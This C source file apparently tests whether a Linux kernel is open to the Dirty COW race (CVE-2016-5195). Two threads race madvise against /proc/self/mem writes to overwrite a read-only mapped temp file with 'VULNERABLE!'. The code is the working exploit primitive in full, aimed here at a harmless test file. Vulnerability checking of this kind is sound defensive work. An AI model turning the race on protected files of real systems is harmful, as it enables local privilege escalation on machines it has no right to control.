#include "prefix.h"

#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/mman.h>
#include <string.h>

#define ITERATIONS 100000000

static const char *file_content = "VULNERABLE!" NL;
struct thread_arguments {
	void *map;
	char *str;
};

static void *madvise_thread(void *arg) {
	struct thread_arguments *args = (struct thread_arguments *)arg;
	void *map = args->map;

	int i, c = 0;
	for (i = 0; i < ITERATIONS; ++i) {
		c += madvise(map, 100, MADV_DONTNEED);
	}

	__DEBUG_PRINTF("madvise %d" NL, c);
	return NULL;
}

static void *memwrite_thread(void *arg) {
	struct thread_arguments *args = (struct thread_arguments *)arg;
	off_t map = (off_t)args->map;
	char *str = args->str;
	size_t len = strlen(str);

	int i, c = 0, fd = open("/proc/self/mem", O_RDWR);

	for (i = 0; i < ITERATIONS; ++i) {
		(void)lseek(fd, map, SEEK_SET);
		c += write(fd, str, len);
	}

	__DEBUG_PRINTF("memwrite %d" NL, c);
	return NULL;
}

static int run_test() {
	char *tmp_path = "/tmp/dirtycow_test";
	int fd = open(tmp_path, O_RDONLY);

	struct stat st;
	if (fstat(fd, &st)) {
		(void)fprintf(stderr, "Could not fstat" NL);
		return 1;
	}

	void *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	if (map == MAP_FAILED) {
		(void)fprintf(stderr, "mmap failed" NL);
		(void)fprintf(stderr, "st_size = %zu ; fd = %u" NL, (size_t)st.st_size, fd);
		return 1;
	}
	__DEBUG_PRINTF("mmap %p" NL, map);

	struct thread_arguments args = { .map = map, .str = strdup(file_content) };

	pthread_t pth1, pth2;

	(void)printf("Racing..." NL);
	(void)pthread_create(&pth1, NULL, madvise_thread, (void *)&args);
	(void)pthread_create(&pth2, NULL, memwrite_thread, (void *)&args);

	/* wait for threads to finish */
	(void)pthread_join(pth1, NULL);
	(void)pthread_join(pth2, NULL);

	return 0;
}

int main(int argc, char *argv[]) {
	return run_test();
}
